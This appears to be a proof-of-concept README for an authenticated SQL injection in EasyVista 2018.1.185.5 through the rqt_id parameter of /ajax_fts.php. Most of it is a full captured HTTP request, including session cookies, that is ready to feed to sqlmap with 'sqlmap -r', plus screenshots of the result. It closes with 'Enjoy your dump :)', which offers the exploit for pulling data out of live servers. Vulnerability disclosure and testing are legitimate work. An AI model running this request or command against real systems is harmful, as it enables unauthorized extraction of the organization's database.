# EasyVista

## easyvista 2018.1.185.5 - CVE-XXX 

* Description : SQL injection vulnerability allow via the rqt_id parameter
* Affected version : 2018.1.185.5

### Information

To make this PoC, I just installed the sofware (`https://www.easyvista.com/`)

* Vulnerability Type : SQL injection (Authenticated)

### POC 

First of all, you can check your version using this URL `xxx.com/version` you will have this kind of ouput :

<img width="1280" alt="version" src="https://raw.githubusercontent.com/michmich1000/EasyVista/master/version.png">


After that, you can give this request to sqlmap (`sqlmap -r theRequestFile.txt`)


```
GET /ajax_fts.php?session_id=3bdb1af820b0f9246576532dd9612cf8241&lng=FR&uniqid=3bdb1af820b0f9246576532dd9612cf8241&ajax_action=getSearchGridResult&rqt_id=&from=kp_menu&stats_off=&from_kp=&fts_ezv_select_cust_engine=ezv&fts_ezv_search_text=test&fts_ezv_filter_bool=custom_sql&fts_ezv_filter_keywords=&fts_ezv_filter_target=action&fts_ezv_filter_lng=fr&fts_ezv_filter_loc=&fts_ezv_filter_dpt=&fts_ezv_filter_topic=&fts_ezv_filter_ci=&fts_ezv_custom_start_date=&fts_ezv_custom_end_date=&fts_ezv_filter_date_pattern= HTTP/1.1
Host: xxxx.com
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://xxxxx.com/ftsmodal.php?PHPSESSID=3bdb1af820b0f9246576532dd9612cf8241&eventName=Procurement_KnowledgeBaseItem&internalurltime=1600255495734&PHPSESSID=325454EGFDSQ3dafdf30f&internalurltime=1600255495736
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=3bdb1af820b0f9246576532dd9612cf8241; uid_0282370a0aER654324b9c028a39a75=1600252617; cookie_account=1337; menu_type=global; uid_aabfafcd5a93456532254c2d1830df8fe4dd9d4=1600255497
```

<img width="1280" alt="Boolean-based" src="https://raw.githubusercontent.com/michmich1000/EasyVista/master/poc.png">

<img width="1280" alt="Boolean-based" src="https://raw.githubusercontent.com/michmich1000/EasyVista/master/vuln.png">

Enjoy your dump :) 
